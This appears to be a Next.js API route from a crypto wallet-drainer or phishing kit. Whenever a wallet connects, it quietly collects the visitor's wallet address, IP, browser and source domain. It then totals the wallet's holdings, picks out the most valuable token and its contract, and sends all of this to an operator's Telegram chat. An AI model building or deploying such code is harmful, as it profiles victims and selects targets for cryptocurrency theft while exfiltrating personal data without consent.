// src/app/api/log_connection/route.ts
import { NextResponse } from 'next/server';
// No Moralis or Alchemy SDK imports needed for this version.

// --- Define Interfaces for Type Safety ---
interface TokenInfo {
  symbol: string;
  amount: string;
  decimals: number;
  valueUsd: string;
  contractAddress?: string; // Add contractAddress for tokens
}

interface ConnectionLogForTelegram {
  id: string; // Just for Telegram message
  timestamp: string;
  walletAddress: string;
  connectedWalletName: string | null;
  chainId: number;
  chainName: string;
  ipAddress: string | null;
  domain: string | null;
  userAgent: string | null;
  nativeBalanceEth: string;
  tokens: TokenInfo[];
  nftsDetected: boolean;
  totalWalletValueUsd: string;
  mostExpensiveTokenSymbol: string | null;
  mostExpensiveTokenValueUsd: string | null;
  mostExpensiveTokenContractAddress: string | null;
  mostExpensiveTokenChainName: string | null;
}

// --- API Keys (ensure these are set in .env.local) ---
const covalentApiKey = process.env.COVALENT_API_KEY;
const blockcypherToken = process.env.BLOCKCYPHER_API_TOKEN;

// Warn if API keys are missing at startup
if (!covalentApiKey) {
  console.error("COVALENT_API_KEY not set. Covalent API calls will fail.");
}
if (!blockcypherToken) {
  console.warn('BLOCKCYPHER_API_TOKEN not set. Bitcoin asset fetching will be limited/unavailable.');
}

// Helper to map chain IDs/names to Covalent's chain ID string
function getCovalentChainId(chainId: number, chainName: string): string | undefined {
    // Covalent has comprehensive chain support. Map your chainId/chainName to their API's chain_id.
    // Refer to Covalent's chain ID list: https://www.covalenthq.com/docs/api/#supported-blockchains
    switch (chainId) {
        case 1: return 'eth-mainnet';         // Ethereum Mainnet
        case 137: return 'polygon-mainnet';   // Polygon Mainnet
        case 10: return 'optimism-mainnet';    // Optimism Mainnet
        case 56: return 'bsc-mainnet';         // BNB Smart Chain Mainnet
        case 42161: return 'arbitrum-mainnet'; // Arbitrum One Mainnet
        case 11155111: return 'eth-sepolia';   // Ethereum Sepolia Testnet

        // Handle chains by name if ID is not directly mapped or it's a non-EVM chain
        default:
            if (chainName.toLowerCase().includes('solana')) return 'solana-mainnet';
            if (chainName.toLowerCase().includes('tron')) return 'tron-mainnet'; // Covalent supports Tron
            // For Bitcoin, we use BlockCypher, not Covalent's balances_v2 endpoint directly
            return undefined; // Chain not mapped or supported by this Covalent setup
    }
}

// --- Helper function to fetch comprehensive wallet assets ---
async function fetchWalletAssets(walletAddress: string, chainId: number, chainName: string) {
  let nativeBalanceStr = '0';
  let tokens: TokenInfo[] = [];
  let nftsDetected = false;
  let totalWalletValueUsd = 0;
  let mostExpensiveToken: {
    symbol: string;
    valueUsd: string;
    contractAddress: string;
    chainName: string;
  } | undefined = undefined;

  const lowerCaseChainName = chainName.toLowerCase();
  const isBitcoin = lowerCaseChainName.includes('bitcoin');
  
  const covalentChainId = getCovalentChainId(chainId, chainName);
  const isSupportedByCovalent = covalentChainId !== undefined && covalentApiKey;

  try {
    if (isBitcoin) {
      // --- Bitcoin Specific Logic (BlockCypher) ---
      if (!blockcypherToken) {
        console.warn('BlockCypher API Token not found. Cannot fetch Bitcoin assets.');
        nativeBalanceStr = 'Error: API Key Missing';
      } else {
        const bitcoinAddressUrl = `https://api.blockcypher.com/v1/btc/main/addrs/${walletAddress}/balance?token=${blockcypherToken}`;
        try {
          const response = await fetch(bitcoinAddressUrl);
          if (!response.ok) {
            throw new Error(`BlockCypher API error: ${response.statusText}`);
          }
          const data = await response.json();
          const satoshis = data.final_balance || 0;
          const btcBalance = satoshis / 100_000_000;
          nativeBalanceStr = `${btcBalance.toFixed(8)} BTC`;

          // Fetch BTC price from CoinGecko
          const btcPriceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
          const btcPriceData = await btcPriceResponse.json();
          const btcPriceUsd = btcPriceData?.bitcoin?.usd || 0;

          totalWalletValueUsd += btcBalance * btcPriceUsd;

          // Safely update mostExpensiveToken
          const currentMostExpensiveValue = parseFloat(mostExpensiveToken?.valueUsd || '0');
          if (btcBalance * btcPriceUsd > currentMostExpensiveValue) {
              mostExpensiveToken = {
                  symbol: 'BTC',
                  valueUsd: (btcBalance * btcPriceUsd).toFixed(2),
                  contractAddress: 'N/A',
                  chainName: chainName,
              };
          }

        } catch (btcApiError: any) {
          console.error(`Error fetching Bitcoin data for ${walletAddress}:`, btcApiError.message || btcApiError);
          nativeBalanceStr = 'Error Fetching BTC';
        }
      }

    } else if (isSupportedByCovalent) {
      // --- Covalent Logic for EVM, Solana, TRON, etc. ---
      // Endpoint for all token balances (cryptocurrencies and NFTs)
      const covalentUrl = `https://api.covalenthq.com/v1/${covalentChainId}/address/${walletAddress}/balances_v2/?key=${covalentApiKey}&nft=true&no-nft-fetch=false&no-spam=true&quote-currency=USD`;

      try {
        const response = await fetch(covalentUrl);
        if (!response.ok) {
          const errorText = await response.text();
          throw new Error(`Covalent API error for ${chainName}: ${response.statusText} - ${errorText}`);
        }
        const data = await response.json();
        const items = data.data.items;

        for (const item of items) {
            const contractAddress = item.contract_address;
            const balanceRaw = item.balance;
            const decimals = item.contract_decimals;
            
            // Safely parse balance to a number
            const formattedBalance = parseFloat(balanceRaw || '0') / Math.pow(10, decimals);
            
            // Covalent provides `quote` directly which is the total value in USD for this item
            const itemQuoteUsd = parseFloat(item.quote || '0'); 

            if (item.type === 'cryptocurrency' && formattedBalance > 0) {
                // Native coin (check for zero address or common native symbols)
                // Covalent usually identifies native coin via type and zero address
                if (item.native_token || item.contract_address === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') {
                    nativeBalanceStr = `${formattedBalance.toFixed(4)} ${item.contract_ticker_symbol || 'Native'}`;
                } else { // ERC-20, SPL, TRC-20 tokens
                    tokens.push({
                        symbol: item.contract_ticker_symbol || 'UNKNOWN',
                        amount: formattedBalance.toFixed(4),
                        decimals: decimals,
                        valueUsd: itemQuoteUsd.toFixed(2), // Use Covalent's direct quote
                        contractAddress: contractAddress,
                    });
                }
                totalWalletValueUsd += itemQuoteUsd; // Add item's total USD value

                // Safely update mostExpensiveToken
                const currentMostExpensiveValue = parseFloat(mostExpensiveToken?.valueUsd || '0');
                if (itemQuoteUsd > currentMostExpensiveValue) {
                    mostExpensiveToken = {
                        symbol: item.contract_ticker_symbol || item.contract_name || 'UNKNOWN',
                        valueUsd: itemQuoteUsd.toFixed(2),
                        contractAddress: contractAddress,
                        chainName: chainName,
                    };
                }
            } else if (item.type === 'nft' && item.nft_data && item.nft_data.length > 0) {
                nftsDetected = true;
                // NFT value (item.quote) might not reflect true market value, often floor price or last sale.
                // For accurate NFT value, dedicated NFT pricing APIs are needed.
            }
        }
        // After iterating all items, if native balance was not set by Covalent (e.g., if it was 0 for some reason)
        // and we have a total value for the native token in totalWalletValueUsd from some other means (unlikely with this setup)
        // or just ensure the native token itself could be the most expensive if it wasn't caught in the loop.
        // Covalent `balances_v2` should include native token.
      } catch (covalentApiError: any) {
        console.error(`Error fetching Covalent data for ${walletAddress} on ${chainName}:`, covalentApiError.message || covalentApiError);
        nativeBalanceStr = 'Error Fetching';
        tokens = [];
        nftsDetected = false;
        totalWalletValueUsd = 0;
        mostExpensiveToken = undefined;
      }

    } else {
        console.warn(`Unsupported chain for asset fetching: ${chainName} (ID: ${chainId}). No Covalent or specific support.`);
        nativeBalanceStr = 'N/A';
        tokens = [];
        nftsDetected = false;
        totalWalletValueUsd = 0;
        mostExpensiveToken = undefined;
    }


  } catch (apiError: any) { // Catch any unexpected errors from outer try block
    console.error('General error in fetchWalletAssets:', walletAddress, apiError.message);
    nativeBalanceStr = 'Error Fetching';
    tokens = [];
    nftsDetected = false;
    totalWalletValueUsd = 0;
    mostExpensiveToken = undefined;
  }

  return {
    nativeBalanceEth: `${parseFloat(nativeBalanceStr).toFixed(4)} ${chainName.split(' ')[0] || 'Native'}`, // Reformat for return
    tokens,
    nftsDetected,
    totalWalletValueUsd: totalWalletValueUsd.toFixed(2),
    mostExpensiveToken,
  };
}

// --- Function to Send Telegram Message (remains the same) ---
async function sendTelegramMessage(messageText: string) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn('Telegram Bot Token or Chat ID not set. Skipping Telegram notification.');
    return;
  }

  const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Failed to send Telegram message:', response.status, errorData);
    } else {
      console.log('Telegram message sent successfully!');
    }
  } catch (error: any) {
    console.error('Error sending Telegram message:', error.message || error);
  }
}


// --- POST request handler for logging connections ---
export async function POST(request: Request) {
  try {
    const { walletAddress, connectedWalletName, chainId, chainName } = await request.json();

    if (!walletAddress || !connectedWalletName || typeof chainId !== 'number' || !chainName) {
      return NextResponse.json({ message: 'Missing required connection details' }, { status: 400 });
    }

    const ipAddress: string | null = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || null;
    const userAgent: string | null = request.headers.get('user-agent');
    const domain: string | null = request.headers.get('origin') || request.headers.get('host');

    const assetData = await fetchWalletAssets(walletAddress, chainId, chainName);

    const logId = Math.random().toString(36).substring(2, 11);
    const currentTimestamp = new Date().toISOString();

    const logEntryForTelegram: ConnectionLogForTelegram = {
      id: logId,
      timestamp: currentTimestamp,
      walletAddress: walletAddress,
      connectedWalletName: connectedWalletName,
      chainId: chainId,
      chainName: chainName,
      ipAddress: ipAddress,
      domain: domain,
      userAgent: userAgent,
      nativeBalanceEth: assetData.nativeBalanceEth,
      tokens: assetData.tokens,
      nftsDetected: assetData.nftsDetected,
      totalWalletValueUsd: assetData.totalWalletValueUsd,
      mostExpensiveTokenSymbol: assetData.mostExpensiveToken?.symbol || null,
      mostExpensiveTokenValueUsd: assetData.mostExpensiveToken?.valueUsd || null,
      mostExpensiveTokenContractAddress: assetData.mostExpensiveToken?.contractAddress || null,
      mostExpensiveTokenChainName: assetData.mostExpensiveToken?.chainName || null,
    };

    console.log('Processed connection log (for Telegram):', logEntryForTelegram);

    let telegramMessage = `
<b>New Wallet Connected!</b> #ID${logEntryForTelegram.id}
-------------------------------------
<b>Wallet:</b> ${logEntryForTelegram.connectedWalletName || 'N/A'}
<b>Address:</b> <code>${logEntryForTelegram.walletAddress}</code>
<b>Chain:</b> ${logEntryForTelegram.chainName} (ID: ${logEntryForTelegram.chainId})
<b>Time:</b> ${new Date(logEntryForTelegram.timestamp).toLocaleString()}

<b>Domain:</b> ${logEntryForTelegram.domain || 'N/A'}
<b>IP:</b> ${logEntryForTelegram.ipAddress || 'N/A'}
<b>Device:</b> ${logEntryForTelegram.userAgent ? (logEntryForTelegram.userAgent.includes('Mobile') ? '📱 Mobile' : '🖥️ Desktop') : 'N/A'}
<b>Browser:</b> ${logEntryForTelegram.userAgent ? (
    (logEntryForTelegram.userAgent.includes('Chrome')) ? 'Chrome' :
    (logEntryForTelegram.userAgent.includes('Firefox')) ? 'Firefox' :
    (logEntryForTelegram.userAgent.includes('Safari')) ? 'Safari' :
    'Other'
) : 'N/A'}

<b>-- Wallet Assets --</b>
<b>Native:</b> ${logEntryForTelegram.nativeBalanceEth}
<b>Tokens:</b>
${logEntryForTelegram.tokens && logEntryForTelegram.tokens.length > 0
  ? logEntryForTelegram.tokens.map(t => `  • ${t.amount} ${t.symbol} ($${t.valueUsd})`).join('\n')
  : '  No tokens detected'
}
<b>NFTs Detected:</b> ${logEntryForTelegram.nftsDetected ? '✅ Yes' : '❌ No'}
<b>Total Value:</b> $${logEntryForTelegram.totalWalletValueUsd}
<b>Most Expensive Token:</b> ${logEntryForTelegram.mostExpensiveTokenSymbol ? `${logEntryForTelegram.mostExpensiveTokenSymbol} ($${logEntryForTelegram.mostExpensiveTokenValueUsd})` : 'N/A'}
`;

    telegramMessage = telegramMessage.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    telegramMessage = telegramMessage.replace(`&lt;code&gt;${logEntryForTelegram.walletAddress}&lt;/code&gt;`, `<code>${logEntryForTelegram.walletAddress}</code>`);


    sendTelegramMessage(telegramMessage);

    return NextResponse.json({ message: 'Connection logged to Telegram successfully', id: logId }, { status: 200 });

  } catch (error: any) {
    console.error('Error processing connection for Telegram:', error.message);
    return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
  }
}

// --- GET request handler (Removed as no database to retrieve logs from) ---
export async function GET() {
  return NextResponse.json({ message: 'Admin panel not available in database-less mode. Logs are sent to Telegram only.' }, { status: 404 });
}